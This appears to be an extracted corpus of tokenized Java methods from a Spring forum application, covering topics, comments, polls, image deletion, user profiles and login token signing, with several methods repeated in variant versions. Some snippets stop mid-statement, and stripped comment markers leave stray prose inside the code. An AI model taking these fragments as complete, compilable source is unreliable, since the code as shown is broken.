public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( " TopicListService.getAllTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . toString ( ) : " (null) " ) + " ; fromDate= " + fromDate ) ; TopicListDto topicListDto = new TopicListDto ( ) ; topicListDto . setCommitMode ( TopicListDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; topicListDto . setFromDate ( fromDate ) ; return topicListDao . getTopics ( topicListDto ) ; } 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) throws TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " tags " ) ; Collection < String > firstLetters = tagService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { List < TagCloudDao . TagDTO > list = tagDao . getTags ( 100 ) ; modelAndView . addObject ( " tagcloud " , list ) ; } else { modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < TagRef , Integer > tags = tagService . getTagsByPrefix ( firstLetter , 1 ) ; if ( tags . isEmpty ( ) ) { throw new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " tags " , tags ) ; } return modelAndView ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( HOVER_PROPERTY , Boolean . TRUE ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " quot " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , true ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public static Predicate < String > boxPredicate ( ) { return DefaultProfile : : isBox ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " quot " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , true ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
private RowMapper < ArchiveStats > mapper ( final Section section , final Group group ) { return ( rs , rowNum ) - > new ArchiveStats ( section , group , rs . getInt ( " year " ) , rs . getInt ( " month " ) , rs . getInt ( " c " ) ) ; } 
protected ModelAndView getData ( HttpServletRequest request ) throws Exception { final Poll poll = pollDao . getMostRecentPoll ( ) ; Topic msg = messageDao . getById ( poll . getTopicId ( ) ) ; int count = pollDao . getVotersCount ( poll . getId ( ) ) ; int countUsers = pollDao . getCountUsers ( poll ) ; ModelAndView result = new ModelAndView ( " boxlets/poll " ) ; result . addObject ( " poll " , poll ) ; result . addObject ( " count " , count ) ; result . addObject ( " message " , msg ) ; result . addObject ( " countUsers " , countUsers ) ; return result ; } 
public Poll getMostRecentPoll ( ) throws PollNotFoundException { return getPoll ( getMostRecentPollId ( ) ) ; } 
public Poll getPoll ( final int pollId ) throws PollNotFoundException { SqlRowSet rs = jdbcTemplate . queryForRowSet ( queryPool , pollId ) ; if ( ! rs . next ( ) ) { throw new PollNotFoundException ( ) ; } return new Poll ( pollId , 
private File processUploadImage ( HttpServletRequest request ) throws IOException { if ( request instanceof MultipartHttpServletRequest ) { MultipartFile multipartFile = ( ( MultipartRequest ) request ) . getFile ( " image " ) ; if ( multipartFile ! = null & & ! multipartFile . isEmpty ( ) ) { File uploadedFile = File . createTempFile ( " lor-image- " , " " ) ; logger . debug ( " Transfering upload to: " + uploadedFile ) ; multipartFile . transferTo ( uploadedFile ) ; return uploadedFile ; } } return null ; } 
public void voteGetCurrentPollTest ( ) throws Exception { int currentPollId = pollDao . getMostRecentPollId ( ) ; Poll poll = pollDao . getMostRecentPoll ( ) ; assertEquals ( currentPollId , poll . getId ( ) ) ; } 
public void testToHtmlFormatter ( ) { assertEquals ( RESULT1 , toHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , toHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , toHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , toHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , toHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , toHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , toHtmlFormatter . format ( TEXT11 , false ) ) ; assertEquals ( RESULT12 , toHtmlFormatter . format ( TEXT12 , false ) ) ; assertEquals ( RESULT13 , toHtmlFormatter . format ( TEXT13 , false ) ) ; assertEquals ( RESULT14 , toHtmlFormatter . format ( TEXT14 , false ) ) ; assertEquals ( RESULT15 , toHtmlFormatter . format ( TEXT15 , false ) ) ; assertEquals ( RESULT16 , toHtmlFormatter . format ( TEXT16 , false ) ) ; assertEquals ( RESULT17 , toHtmlFormatter . format ( TEXT17 , false ) ) ; assertEquals ( RESULT17_2 , toHtmlFormatter . format ( TEXT17_2 , false ) ) ; assertEquals ( RESULT18 , toHtmlFormatter . format ( TEXT18 , false ) ) ; assertEquals ( RESULT19 , toHtmlFormatter . format ( TEXT19 , false ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public MemoriesDao memoriesDao ( DataSource ds ) { return new MemoriesDao ( ds ) ; } 
public List < Integer > deleteWithReplys ( Topic topic , Comment comment , String reason , User user , int scoreBonus ) { CommentList commentList = commentService . getCommentList ( topic , false ) ; CommentNode node = commentList . getNode ( comment . getId ( ) ) ; List < CommentAndDepth > replys = getAllReplys ( node , 0 ) ; List < Integer > deleted = deleteReplys ( comment , reason , replys , user , - scoreBonus ) ; userEventService . processCommentsDeleted ( deleted ) ; return deleted ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Topic . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { try { setValue ( topicDao . getById ( Integer . parseInt ( text . split ( " , " ) [ 0 ] ) ) ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { if ( text . isEmpty ( ) | | " 0 " . equals ( text ) ) { setValue ( null ) ; return ; } try { setValue ( commentDao . getById ( Integer . parseInt ( text ) ) ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( User . class , new UserPropertyEditor ( userService ) ) ; } 
public void setAsText ( String text ) throws IllegalArgumentException { try { setValue ( topicDao . getById ( Integer . parseInt ( text . split ( " , " ) [ 0 ] ) ) ) ; 
protected String makeTokenSignature ( long tokenExpiryTime , String username , String password ) { String data = username + " : " + tokenExpiryTime + " : " + password + " : " + getKey ( ) ; int tokenGeneration = userDao . getTokenGeneration ( username ) ; if ( tokenGeneration > 0 ) { zero means user does not use close all sessions ever data += ":" + String.format("%d", tokenGeneration); } MessageDigest digest; try { digest = MessageDigest.getInstance("MD5"); } catch (NoSuchAlgorithmException e) { throw new IllegalStateException("No MD5 algorithm available!"); } return new String(Hex.encode(digest.digest(data.getBytes()))); } 
public ModelAndView logoutAllDevices ( HttpServletRequest request , HttpServletResponse response ) { userDao . unloginAllSessions ( Template . getTemplate ( request ) . getCurrentUser ( ) ) ; return logout ( request , response ) ; } 
public void unloginAllSessions ( User user ) { jdbcTemplate . update ( " UPDATE users SET token_generation=token_generation+1 WHERE id=? " , user . getId ( ) ) ; } 
public ModelAndView logoutAllDevices ( HttpServletRequest request , HttpServletResponse response ) { if ( AuthUtil . isSessionAuthorized ( ) ) { userDao . unloginAllSessions ( Template . getTemplate ( request ) . getCurrentUser ( ) ) ; } return logout ( request , response ) ; } 
public void insert ( EditHistoryRecord editHistoryRecord ) { editInsert . execute ( new BeanPropertySqlParameterSource ( editHistoryRecord ) ) ; } 
public void insert ( EditHistoryRecord editHistoryRecord ) { editHistoryDao . insert ( editHistoryRecord ) ; } 
public StandaloneWSClient httpClient ( ) { return mock ( StandaloneWSClient . class ) ; } 
public void deleteInactivated ( ) { jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval " ) ; } 
private static BufferedImage removeTransparency ( BufferedImage image ) { BufferedImage outImage = new BufferedImage ( image . getWidth ( null ) , image . getHeight ( null ) , BufferedImage . TYPE_INT_RGB ) ; Graphics2D g = outImage . createGraphics ( ) ; g . drawImage ( image , 0 , 0 , outImage . getWidth ( ) , outImage . getHeight ( ) , Color . WHITE , null ) ; return outImage ; } 
private void prepareModelForCommonException ( ModelAndView modelAndView , HttpServletRequest request , Exception exception ) { modelAndView . addObject ( " headTitle " , StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) ) ; String errorMessage = exception . getMessage ( ) = = null ? StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) : StringUtil . escapeHtml ( exception . getMessage ( ) ) ; modelAndView . addObject ( " errorMessage " , errorMessage ) ; ExceptionType exceptionType = ExceptionType . OTHER ; if ( exception instanceof UserErrorException ) { exceptionType = ExceptionType . IGNORED ; } else if ( exception instanceof ScriptErrorException | | exception instanceof RequestRejectedException ) { logger . debug ( " errors/common.jsp " , exception ) ; exceptionType = ExceptionType . SCRIPT_ERROR ; } else { logger . warn ( " Unexcepted exception caught " , exception ) ; String infoMessage = emailService . sendExceptionReport ( request , exception ) ; modelAndView . addObject ( " infoMessage " , infoMessage ) ; } modelAndView . addObject ( " exceptionType " , exceptionType . name ( ) ) ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) throws Exception { Topic message = messageDao . getById ( msgid ) ; Template tmpl = Template . getTemplate ( request ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; topicPermissionService . checkView ( group , message , tmpl . getCurrentUser ( ) , false ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
public ModelAndView showCommentEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid , @PathVariable ( " commentid " ) int commentId ) throws Exception { Topic message = messageDao . getById ( msgid ) ; Comment comment = commentService . getById ( commentId ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( comment ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
public boolean isImageDeleted ( ) { return imageDeleted ; } 
public ModelAndView deleteForm ( @RequestParam int id , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic topic = topicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( topic , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , tmpl . getCurrentUser ( ) ) ; ModelAndView mv = new ModelAndView ( " delete_image " ) ; mv . addObject ( " image " , image ) ; mv . addObject ( " preparedTopic " , preparedTopic ) ; return mv ; } 
public RedirectView deleteImage ( @RequestParam int id , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic topic = topicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( topic , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , tmpl . getCurrentUser ( ) ) ; imageService . deleteImage ( tmpl . getCurrentUser ( ) , image ) ; return new RedirectView ( TopicLinkBuilder . baseLink ( topic ) . forceLastmod ( ) . build ( ) ) ; } 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , String message , UploadedImagePreview scrn , Topic previewMsg ) throws Exception { session . removeAttribute ( " image " ) ; int msgid = topicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; } params . put ( " moderated " , section . isPremoderated ( ) ) ; params . put ( " url " , messageUrl ) ; return new ModelAndView ( " add-done-moderated " , params ) ; } 
public ModelAndView show ( HttpServletRequest request , @ModelAttribute ( " form " ) DeregisterRequest form ) { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; return new ModelAndView ( " deregister " ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new DeregisterRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class aClass ) { return DeregisterRequest . class . equals ( aClass ) ; } 
private boolean doDeleteComment ( int msgid , String reason , User user , int scoreBonus ) { boolean deleted = commentDao . deleteComment ( msgid , reason , user ) ; if ( deleted ) { deleteInfoDao . insert ( msgid , user , reason , scoreBonus ) ; } return deleted ; } 
private boolean doDeleteComment ( int msgid , String reason , User user ) { return doDeleteComment ( msgid , reason , user , 0 ) ; } 
public String renderToHtml ( String content ) { You can re-use parser and renderer instances Node document = parser.parse(content); return renderer.render(document); } 
public void testMarkdownFormatter ( ) { assertEquals ( TEXT1_RESULT , markdownFormatter . renderToHtml ( TEXT1 ) ) ; } 
private PreparedComment prepareComment ( @Nonnull Comment comment ) throws UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; return prepareComment ( messageText , author , null , comment , null , null , null ) ; } 
private PreparedRSSComment prepareRSSComment ( @Nonnull MessageText messageText , @Nonnull Comment comment ) throws UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = prepareCommentTextRSS ( messageText ) ; return new PreparedRSSComment ( comment , author , processedMessage ) ; } 
public PreparedComment prepareCommentForReplyto ( Comment comment ) throws UserNotFoundException { return prepareComment ( comment ) ; } 
public List < PreparedRSSComment > prepareCommentListRSS ( @Nonnull List < Comment > list ) throws UserNotFoundException { List < PreparedRSSComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; commentsPrepared . add ( prepareRSSComment ( messageText , comment ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , boolean secure , @Nonnull Template tmpl , @Nonnull Topic topic ) throws UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( Lists . transform ( list , Comment : : getId ) ) ; Map < Integer , User > users = loadUsers ( Iterables . transform ( list , Comment : : getUserid ) ) ; User currentUser = tmpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } List < PreparedComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText text = texts . get ( comment . getId ( ) ) ; User author = users . get ( comment . getUserid ( ) ) ; Remark remark = remarks . get ( author . getId ( ) ) ; String remarkText = null ; if ( remark ! = null ) { remarkText = remark . getText ( ) ; } commentsPrepared . add ( prepareComment ( text , author , remarkText , comment , comments , tmpl , topic ) ) ; } return commentsPrepared ; } 
private String prepareCommentText ( MessageText messageText , boolean nofollow ) { if ( messageText . isLorcode ( ) ) { return lorCodeService . parseComment ( messageText . text ( ) , nofollow ) ; 
private String prepareCommentTextRSS ( MessageText messageText ) { return lorCodeService . prepareTextRSS ( messageText . text ( ) , messageText . isLorcode ( ) ) ; } 
public ModelAndView deleteForm ( @RequestParam int id , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic topic = topicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( topic , tmpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , tmpl . getCurrentUser ( ) ) ; ModelAndView mv = new ModelAndView ( " delete_image " ) ; mv . addObject ( " image " , image ) ; mv . addObject ( " preparedTopic " , preparedTopic ) ; return mv ; } 
public RedirectView deleteImage ( @RequestParam int id , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic topic = topicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( topic , tmpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , tmpl . getCurrentUser ( ) ) ; imageService . deleteImage ( tmpl . getCurrentUser ( ) , image ) ; return new RedirectView ( TopicLinkBuilder . baseLink ( topic ) . forceLastmod ( ) . build ( ) ) ; } 
public ModelAndView topics ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) { Group group = groupDao . getGroup ( groupId ) ; if ( offsetObject ! = null ) { return new ModelAndView ( new RedirectView ( group . getUrl ( ) + " ?offset= " + offsetObject . toString ( ) ) ) ; 
public ModelAndView topicsLastmod ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) { Group group = groupDao . getGroup ( groupId ) ; if ( offsetObject ! = null ) { return new ModelAndView ( new RedirectView ( group . getUrl ( ) + " ?offset= " + offsetObject . toString ( ) + " &lastmod=true " ) ) ; 
public ModelAndView showForm ( @RequestParam ( " group " ) int id , ServletRequest request ) { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Group group = groupDao . getGroup ( id ) ; ModelAndView mv = new ModelAndView ( " groupmod " , " group " , group ) ; mv . getModel ( ) . put ( " groupInfo " , prepareService . prepareGroupInfo ( group ) ) ; return mv ; } 
private MessageText messageTextOf ( ResultSet resultSet ) throws SQLException { String text = resultSet . getString ( " message " ) ; String markup = resultSet . getString ( " markup " ) ; return new MessageText ( text , MarkupType$ . MODULE$ . of ( markup ) ) ; } 
private void loadTopicScroller ( Map < String , Object > params , Topic topic , User currentUser , boolean useIgnoreList ) { Topic prevMessage ; Topic nextMessage ; if ( useIgnoreList ) { prevMessage = messageDao . getPreviousMessage ( topic , currentUser ) ; nextMessage = messageDao . getNextMessage ( topic , currentUser ) ; } else { prevMessage = messageDao . getPreviousMessage ( topic , null ) ; nextMessage = messageDao . getNextMessage ( topic , null ) ; } params . put ( " prevMessage " , prevMessage ) ; params . put ( " nextMessage " , nextMessage ) ; boolean topScroller ; SectionScrollModeEnum sectionScroller = sectionService . getScrollMode ( topic . getSectionId ( ) ) ; if ( prevMessage = = null & & nextMessage = = null ) { topScroller = false ; } else { topScroller = sectionScroller ! = SectionScrollModeEnum . NO_SCROLL ; } params . put ( " topScroller " , topScroller ) ; Boolean bottomScroller = sectionScroller ! = SectionScrollModeEnum . NO_SCROLL ; params . put ( " bottomScroller " , bottomScroller ) ; } 
public PreparedTopic prepareTopic ( Topic message , User user ) { return prepareMessage ( message , 
public PreparedTopic prepareTopic ( Topic message , List < TagRef > tags , User user , MessageText text ) { return prepareMessage ( message , 
public PreparedTopic prepareTopicPreview ( Topic message , List < TagRef > tags , Poll newPoll , String text , Image image ) { return prepareMessage ( message , 
private PreparedTopic prepareMessage ( Topic message , List < TagRef > tags , boolean minimizeCut , PreparedPoll poll , User user , MessageText text , @Nullable Image image ) { try { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > tags = topicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , user , textMap . get ( message . getId ( ) ) , null ) ; TopicMenu topicMenu = getTopicMenu ( preparedMessage , user , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages ) { List < PreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > tags = topicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , null , textMap . get ( message . getId ( ) ) , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public String extractPlainText ( MessageText text ) { if ( text . isLorcode ( ) ) { return extractPlainTextFromLorcode ( text . text ( ) ) ; 
private PreparedRSSComment prepareRSSComment ( @Nonnull MessageText messageText , @Nonnull Comment comment ) throws UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = textService . renderTextRSS ( messageText ) ; return new PreparedRSSComment ( comment , author , processedMessage ) ; } 
public PreparedComment prepareCommentForEdit ( Comment comment , MessageText message ) throws UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = textService . renderCommentText ( message , false ) ; ApiUserRef ref = userService . ref ( author , null ) ; return new PreparedComment ( comment , 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new CommentRequestValidator ( textService ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
private MessageText processMessage ( String msg , String mode ) { if ( " ntobr " . equals ( mode ) ) { return MessageText . apply ( toLorCodeFormatter . format ( msg ) , MarkupType . Lorcode$ . MODULE$ ) ; 
public void saveNewMessage ( MessageText message , int msgid ) { insertMsgbase . execute ( ImmutableMap . < String , Object > of ( " id " , msgid , 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , MessageText message , UploadedImagePreview scrn , Topic previewMsg ) throws Exception { session . removeAttribute ( " image " ) ; int msgid = topicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; } params . put ( " moderated " , section . isPremoderated ( ) ) ; params . put ( " url " , messageUrl ) ; return new ModelAndView ( " add-done-moderated " , params ) ; } 
public int saveNewMessage ( final Topic msg , final User user , MessageText text , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?) " , ( PreparedStatementCallback < String > ) pst - > { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } ) ; msgbaseDao . saveNewMessage ( text , msgid ) ; return msgid ; } 
public PreparedTopic prepareTopicPreview ( Topic message , List < TagRef > tags , Poll newPoll , MessageText text , Image image ) { return prepareMessage ( message , 
public String parseCommentRSS ( String text ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( true , false ) , text ) . renderXHtml ( ) ; } 
public void testEmpty ( ) { assertTrue ( textService . isEmpty ( MessageText . apply ( " [br] " , MarkupType . Lorcode$ . MODULE$ ) ) ) ; assertTrue ( textService . isEmpty ( MessageText . apply ( " [br] " , MarkupType . Lorcode$ . MODULE$ ) ) ) ; assertTrue ( textService . isEmpty ( MessageText . apply ( " [b] [br][/b][u] " , MarkupType . Lorcode$ . MODULE$ ) ) ) ; assertTrue ( textService . isEmpty ( MessageText . apply ( " [list][*][br][br][*][u][/u][/list] " , MarkupType . Lorcode$ . MODULE$ ) ) ) ; assertTrue ( textService . isEmpty ( MessageText . apply ( " [url] [/url][list][*][br][br][*][u][/u][/list][/url] " , MarkupType . Lorcode$ . MODULE$ ) ) ) ; assertFalse ( textService . isEmpty ( MessageText . apply ( " [code]text[/code] " , MarkupType . Lorcode$ . MODULE$ ) ) ) ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " lorcode " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , true ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
private static String fixFormat ( String mode ) { if ( ! " ntobr " . equals ( mode ) & & ! " lorcode " . equals ( mode ) ) { return ( String ) DefaultProfile . getDefaultProfile ( ) . get ( " format.mode " ) ; } return mode ; } 
